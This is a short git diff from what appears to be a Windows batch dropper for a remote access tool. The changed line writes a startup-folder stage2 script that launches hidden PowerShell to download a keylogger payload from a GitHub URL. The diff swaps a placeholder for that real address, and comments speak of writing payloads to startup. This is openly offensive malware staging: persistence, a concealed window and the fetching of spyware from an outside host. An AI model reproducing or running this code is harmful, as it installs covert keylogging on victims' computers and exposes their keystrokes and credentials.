@@ -11,7 +11,7 @@ cd %STARTUP%
 @REM To Do: build out stage 2 (build stage2 or download it through internet)
 @REM write playloads to startup 
 (
-    echo powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri url_to_payload -OutFile p.ps1"
+    echo powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://github.com/tarasermolenko/RemoteAccessTool/blob/main/payloads/keylogger.ps1 -OutFile p.ps1"
 
 ) > stage2.cmd
 
